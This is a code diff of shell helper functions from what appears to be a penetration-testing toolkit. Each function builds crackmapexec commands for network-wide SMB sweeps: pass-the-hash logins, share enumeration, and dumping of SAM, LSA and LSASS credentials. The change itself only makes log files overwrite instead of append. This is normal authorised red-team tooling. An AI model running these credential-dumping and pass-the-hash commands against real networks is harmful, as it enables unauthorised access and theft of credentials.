@@ -43,17 +43,17 @@ nb-ad-pth-pass() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' | tee -a $(__netadpath)/cme-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' | tee $(__netadpath)/cme-sweep.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' | tee -a $(__netadpath)/cme-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' | tee $(__netadpath)/cme-sweep.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth | tee -a $(__netadpath)/cme-sweep.txt"
+        print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth | tee $(__netadpath)/cme-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -77,17 +77,17 @@ nb-ad-pth-enum() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --shares | tee -a $(__netadpath)/cme-SHARES-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --shares | tee $(__netadpath)/cme-SHARES-sweep.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --shares | tee -a $(__netadpath)/cme-SHARES-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --shares | tee $(__netadpath)/cme-SHARES-sweep.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --shares | tee -a $(__netadpath)/cme-SHARES-sweep.txt"
+  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --shares | tee $(__netadpath)/cme-SHARES-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -111,17 +111,17 @@ nb-ad-pth-sam() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --sam | tee -a $(__netadpath)/cme-SAM-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --sam | tee $(__netadpath)/cme-SAM-sweep.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --sam | tee -a $(__netadpath)/cme-SAM-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --sam | tee $(__netadpath)/cme-SAM-sweep.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --sam | tee -a $(__netadpath)/cme-SAM-sweep.txt"
+  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --sam | tee $(__netadpath)/cme-SAM-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -145,17 +145,17 @@ nb-ad-pth-lsa() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --lsa | tee -a $(__netadpath)/cme-LSA-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' --lsa | tee $(__netadpath)/cme-LSA-sweep.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --lsa | tee -a $(__netadpath)/cme-LSA-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' --lsa | tee $(__netadpath)/cme-LSA-sweep.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --lsa | tee -a $(__netadpath)/cme-LSA-sweep.txt"
+  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --lsa | tee $(__netadpath)/cme-LSA-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
@@ -179,17 +179,17 @@ nb-ad-pth-lsassy() {
             nb-vars-set-domain
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -M lsassy | tee -a $(__netadpath)/cme-LSASSY-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p '${__PASS}' -M lsassy | tee $(__netadpath)/cme-LSASSY-sweep.txt"
         else
             __ask "Enter a password for authentication"
             nb-vars-set-pass
-            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -M lsassy | tee -a $(__netadpath)/cme-LSASSY-sweep.txt"
+            print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -p '${__PASS}' -M lsassy | tee $(__netadpath)/cme-LSASSY-sweep.txt"
         fi
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NTLM hash for authentication"
         __check-hash
-  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M lsassy | tee -a $(__netadpath)/cme-LSASSY-sweep.txt"
+  	    print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M lsassy | tee $(__netadpath)/cme-LSASSY-sweep.txt"
     else
         echo
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
